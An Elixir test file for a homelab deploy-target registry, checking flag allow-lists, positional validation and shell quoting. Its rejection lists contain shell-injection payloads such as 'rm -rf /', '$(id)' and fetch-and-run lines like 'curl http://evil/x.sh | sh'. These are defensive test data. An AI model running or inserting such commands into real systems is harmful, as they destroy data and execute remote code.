defmodule OrcaHub.Deploys.RegistryTest do
  # async: false — several tests put/restore `:deploy_targets` app env.
  use ExUnit.Case, async: false

  alias OrcaHub.Deploys.Registry
  alias OrcaHub.Jobs.Paths

  doctest OrcaHub.Deploys.Registry

  defp put_targets(targets) do
    previous = Application.get_env(:orca_hub, :deploy_targets)

    on_exit(fn ->
      if previous,
        do: Application.put_env(:orca_hub, :deploy_targets, previous),
        else: Application.delete_env(:orca_hub, :deploy_targets)
    end)

    Application.put_env(:orca_hub, :deploy_targets, targets)
  end

  describe "the checked-in default map" do
    test "ships the three deploy scripts that exist in ~/homelab/scripts" do
      assert Registry.keys() == ["content-studio", "orca_hub", "video-search"]
    end

    test "orca_hub is the only escape_cgroup target and the only one with a verify_command" do
      {:ok, orca} = Registry.fetch("orca_hub")
      {:ok, cs} = Registry.fetch("content-studio")
      {:ok, vs} = Registry.fetch("video-search")

      # §2.3 — only this script restarts its own hub at step 7.
      assert orca.escape_cgroup
      refute cs.escape_cgroup
      refute vs.escape_cgroup

      assert orca.verify_command == "/home/zach/homelab/scripts/verify-orca-deploy.sh"
      assert is_nil(cs.verify_command)
      assert is_nil(vs.verify_command)
    end

    test "carries the surveyed directory, positional kind and TTL per target" do
      assert {:ok, %{directory: "/home/zach/orca_hub", positional: :none, ttl_seconds: 5400}} =
               Registry.fetch("orca_hub")

      assert {:ok,
              %{
                directory: "/home/zach/circus-of-puffins/voice_prompt",
                positional: :version,
                ttl_seconds: 2700
              }} = Registry.fetch("content-studio")

      assert {:ok,
              %{
                directory: "/home/zach/dell/elastic-video-search",
                positional: :ref,
                ttl_seconds: 2700
              }} = Registry.fetch("video-search")
    end

    test "fetch/1 refuses an unknown key rather than raising" do
      assert Registry.fetch("nope") == {:error, :unknown_target}
      assert Registry.fetch(nil) == {:error, :unknown_target}
      assert Registry.fetch(:orca_hub) == {:error, :unknown_target}
    end
  end

  describe "node resolution" do
    test "defaults to the evaluating node rather than a baked-in literal" do
      # An earlier design draft hardcoded "orca@debian", which is wrong on
      # this host (it is debian@192.168.1.177, from rel/env.sh.eex).
      {:ok, orca} = Registry.fetch("orca_hub")
      assert orca.node == Atom.to_string(node())
      refute orca.node == "orca@debian"
    end

    test "config pins a node per target, overriding the default" do
      put_targets(%{"orca_hub" => %{node: "debian@192.168.1.177"}})

      assert {:ok, %{node: "debian@192.168.1.177"}} = Registry.fetch("orca_hub")
      # Untouched targets still resolve to this node.
      assert {:ok, %{node: node_str}} = Registry.fetch("video-search")
      assert node_str == Atom.to_string(node())
    end
  end

  describe "config override deep-merges over the default map" do
    test "an override names only the keys it changes" do
      put_targets(%{"orca_hub" => %{ttl_seconds: 7200}})

      {:ok, orca} = Registry.fetch("orca_hub")

      assert orca.ttl_seconds == 7200
      # Everything else survives the merge.
      assert orca.command == "/home/zach/homelab/scripts/deploy-orca-hub.sh"
      assert orca.directory == "/home/zach/orca_hub"
      assert orca.escape_cgroup
      assert "--skip-arm64" in orca.allowed_flags
    end

    test "a list-valued key is REPLACED, not appended to" do
      put_targets(%{"video-search" => %{allowed_flags: ~w(--dry-run)}})

      assert {:ok, %{allowed_flags: ["--dry-run"]}} = Registry.fetch("video-search")

      assert Registry.validate_flags(elem(Registry.fetch("video-search"), 1), ["--force"]) ==
               {:error, :disallowed_flag, %{flag: "--force", allowed_flags: ["--dry-run"]}}
    end

    test "a fourth target can be added in config with no code change" do
      put_targets(%{
        "some-new-app" => %{
          name: "Some New App",
          command: "/home/zach/homelab/scripts/deploy-some-new-app.sh",
          directory: "/home/zach/some-new-app",
          allowed_flags: ~w(--dry-run),
          positional: :ref,
          escape_cgroup: false,
          ttl_seconds: 900
        }
      })

      assert "some-new-app" in Registry.keys()
      assert {:ok, %{name: "Some New App", node: _}} = Registry.fetch("some-new-app")
      # The three checked-in targets are untouched.
      assert {:ok, %{ttl_seconds: 5400}} = Registry.fetch("orca_hub")
    end

    test "default_targets/0 is the pre-override, pre-node-resolution map" do
      put_targets(%{"orca_hub" => %{ttl_seconds: 1}})

      refute Map.has_key?(Registry.default_targets()["orca_hub"], :node)
      assert Registry.default_targets()["orca_hub"].ttl_seconds == 5400
    end
  end

  describe "validate_flags/2 — exact-match allow-list" do
    test "every allowed flag of every target is accepted, one at a time and all at once" do
      for {_key, config} <- Registry.all() do
        for flag <- config.allowed_flags do
          assert {:ok, [^flag]} = Registry.validate_flags(config, [flag])
        end

        assert {:ok, _} = Registry.validate_flags(config, config.allowed_flags)
      end
    end

    test "an empty flag list is fine" do
      {:ok, orca} = Registry.fetch("orca_hub")
      assert Registry.validate_flags(orca, []) == {:ok, []}
    end

    test "anything not literally in the list is refused, and the refusal echoes the allow-list" do
      {:ok, orca} = Registry.fetch("orca_hub")

      rejected = [
        # not a flag of this script at all
        "--nope",
        # real flag of a DIFFERENT target
        "--force",
        # -h/--help would make the script exit 0 without deploying
        "-h",
        "--help",
        # near-misses: the allow-list is exact match, not a parser
        "--skip-push=1",
        "--skip-push ",
        " --skip-push",
        "--Skip-Push",
        "--skip",
        # shell injection attempts
        "--skip-push; rm -rf /",
        "$(id)",
        "`id`",
        "--allow-dirty && curl evil.sh | sh",
        "\n--allow-dirty"
      ]

      for flag <- rejected do
        assert {:error, :disallowed_flag, details} = Registry.validate_flags(orca, [flag]),
               "expected #{inspect(flag)} to be refused"

        assert details.flag == flag
        assert details.allowed_flags == orca.allowed_flags
      end
    end

    test "one bad flag poisons an otherwise-valid list" do
      {:ok, orca} = Registry.fetch("orca_hub")

      assert {:error, :disallowed_flag, %{flag: "--rm-rf"}} =
               Registry.validate_flags(orca, ["--skip-push", "--rm-rf", "--allow-dirty"])
    end

    test "non-string and non-list input is refused, not crashed on" do
      {:ok, orca} = Registry.fetch("orca_hub")

      assert {:error, :disallowed_flag, _} = Registry.validate_flags(orca, [:"--skip-push"])
      assert {:error, :disallowed_flag, _} = Registry.validate_flags(orca, ["--skip-push", 1])

      assert {:error, :disallowed_flag, %{reason: _}} =
               Registry.validate_flags(orca, "--skip-push")
    end
  end

  describe "validate_positional/2 — shape validation" do
    test "nil and \"\" are always valid: every positional is optional" do
      for key <- Registry.keys() do
        {:ok, config} = Registry.fetch(key)
        assert Registry.validate_positional(config, nil) == {:ok, nil}
        assert Registry.validate_positional(config, "") == {:ok, nil}
      end
    end

    test ":version accepts x.y.z and nothing else" do
      {:ok, cs} = Registry.fetch("content-studio")

      for good <- ~w(0.17.3 1.2.3 10.0.114) do
        assert Registry.validate_positional(cs, good) == {:ok, good}
      end

      for bad <- ["1.2", "v1.2.3", "1.2.3.4", "1.2.3-rc1", "1.2.x", "01a1b00", "origin/main"] do
        assert {:error, :invalid_positional, %{value: ^bad}} =
                 Registry.validate_positional(cs, bad),
               "expected #{inspect(bad)} to be refused"
      end
    end

    test ":ref accepts git-ref-shaped strings" do
      {:ok, vs} = Registry.fetch("video-search")

      for good <- ~w(origin/main main v1.2.3 7b3d0c9 feature/some_thing-2 refs/tags/v1) do
        assert Registry.validate_positional(vs, good) == {:ok, good}
      end
    end

    test "a positional may never start with '-' — it would ride past the flag allow-list" do
      # "--force" matches the design's [A-Za-z0-9._/-]+ ref shape exactly, so
      # shape alone would let an argument in through the positional slot.
      {:ok, vs} = Registry.fetch("video-search")

      for bad <- ["--force", "--dry-run", "-h", "-"] do
        assert {:error, :invalid_positional, %{reason: "must not start with '-'"}} =
                 Registry.validate_positional(vs, bad),
               "expected #{inspect(bad)} to be refused"
      end
    end

    test "a target with positional: :none refuses any value" do
      {:ok, orca} = Registry.fetch("orca_hub")

      assert {:error, :invalid_positional, %{reason: "this target takes no positional argument"}} =
               Registry.validate_positional(orca, "1.2.3")
    end

    test "an over-long or non-string positional is refused" do
      {:ok, vs} = Registry.fetch("video-search")

      assert {:error, :invalid_positional, _} =
               Registry.validate_positional(vs, String.duplicate("a", 201))

      assert {:error, :invalid_positional, %{reason: "must be a string"}} =
               Registry.validate_positional(vs, 123)
    end

    test "shell metacharacters are refused by shape for both positional kinds" do
      {:ok, cs} = Registry.fetch("content-studio")
      {:ok, vs} = Registry.fetch("video-search")

      payloads = [
        "; rm -rf /",
        "main; rm -rf ~",
        "`id`",
        "$(id)",
        "${HOME}",
        "main && curl http://evil/x.sh | sh",
        "main | tee /tmp/x",
        "main\nrm -rf /",
        "main\ttab",
        "main$(touch /tmp/pwned)",
        "'; rm -rf /; '",
        "main # comment",
        "main >/tmp/out",
        "1.2.3; rm -rf /"
      ]

      for payload <- payloads do
        assert {:error, :invalid_positional, _} = Registry.validate_positional(vs, payload),
               "expected :ref to refuse #{inspect(payload)}"

        assert {:error, :invalid_positional, _} = Registry.validate_positional(cs, payload),
               "expected :version to refuse #{inspect(payload)}"
      end
    end
  end

  describe "build_command/2" do
    test "composes script + flags + positional, shell-quoted, in that order" do
      assert {:ok, built} =
               Registry.build_command("video-search",
                 flags: ["--dry-run", "--force"],
                 positional: "origin/main"
               )

      assert built.argv == [
               "/home/zach/homelab/scripts/deploy-video-search.sh",
               "--dry-run",
               "--force",
               "origin/main"
             ]

      assert built.command ==
               "'/home/zach/homelab/scripts/deploy-video-search.sh' '--dry-run' '--force' 'origin/main'"

      assert built.target == "video-search"
      assert built.config.directory == "/home/zach/dell/elastic-video-search"
    end

    test "omits the positional when none is given" do
      assert {:ok, %{argv: argv, command: command}} =
               Registry.build_command("orca_hub", flags: ["--skip-arm64"])

      assert argv == ["/home/zach/homelab/scripts/deploy-orca-hub.sh", "--skip-arm64"]
      assert command == "'/home/zach/homelab/scripts/deploy-orca-hub.sh' '--skip-arm64'"
    end

    test "no flags and no positional is just the script" do
      assert {:ok, %{argv: ["/home/zach/homelab/scripts/deploy-orca-hub.sh"]}} =
               Registry.build_command("orca_hub")
    end

    test "propagates validation refusals instead of composing" do
      assert {:error, :unknown_target} = Registry.build_command("nope")

      assert {:error, :disallowed_flag, _} =
               Registry.build_command("orca_hub", flags: ["--rm-rf"])

      assert {:error, :invalid_positional, _} =
               Registry.build_command("video-search", positional: "main; rm -rf /")
    end
  end

  describe "shell quoting is a real second layer, not decoration" do
    @tag :tmp_dir
    test "a metacharacter payload reaches the script as ONE literal argv entry", %{tmp_dir: tmp} do
      # Proves the shq/1 layer holds even if a shape rule were ever loosened:
      # a config-added target pointing at a throwaway argv-printing script
      # (never a real deploy script), invoked through `sh -c` exactly the way
      # OrcaHub.Deploys will invoke a composed command.
      script = Path.join(tmp, "echo-argv.sh")
      File.write!(script, "#!/bin/sh\nfor a in \"$@\"; do printf '[%s]\\n' \"$a\"; done\n")
      File.chmod!(script, 0o755)

      canary = Path.join(tmp, "pwned")

      payloads = [
        "; rm -rf /",
        "`touch #{canary}`",
        "$(touch #{canary})",
        "a && touch #{canary}",
        "a | touch #{canary}",
        "it's a quote",
        "a\nb"
      ]

      for payload <- payloads do
        command =
          [script, "--flag", payload] |> Enum.map(&Paths.shq/1) |> Enum.join(" ")

        {out, status} = System.cmd("sh", ["-c", command], stderr_to_stdout: true)

        assert status == 0
        assert out == "[--flag]\n[#{payload}]\n", "payload #{inspect(payload)} escaped its quotes"
      end

      refute File.exists?(canary), "a quoted payload executed a command substitution"
    end
  end

  describe "check_script/1" do
    @tag :tmp_dir
    test "accepts an executable file, refuses a missing or non-executable one", %{tmp_dir: tmp} do
      exec = Path.join(tmp, "deploy.sh")
      File.write!(exec, "#!/bin/sh\nexit 0\n")
      File.chmod!(exec, 0o755)

      plain = Path.join(tmp, "notes.txt")
      File.write!(plain, "hello")
      File.chmod!(plain, 0o644)

      missing = Path.join(tmp, "gone.sh")

      assert Registry.check_script(%{command: exec}) == :ok
      assert Registry.check_script(%{command: plain}) == {:error, :script_not_executable, plain}
      assert Registry.check_script(%{command: missing}) == {:error, :script_missing, missing}
    end

    test "looks a target up by key" do
      assert Registry.check_script("nope") == {:error, :unknown_target}
    end
  end

  describe "deep_merge/2" do
    test "recurses into nested maps and replaces scalars" do
      assert Registry.deep_merge(%{a: %{b: 1, c: 2}, d: 3}, %{a: %{c: 9}, e: 4}) ==
               %{a: %{b: 1, c: 9}, d: 3, e: 4}
    end

    test "replaces a struct wholesale rather than merging its fields" do
      left = %{at: ~D[2020-01-01]}
      right = %{at: ~D[2026-09-20]}
      assert Registry.deep_merge(left, right) == %{at: ~D[2026-09-20]}
    end
  end
end
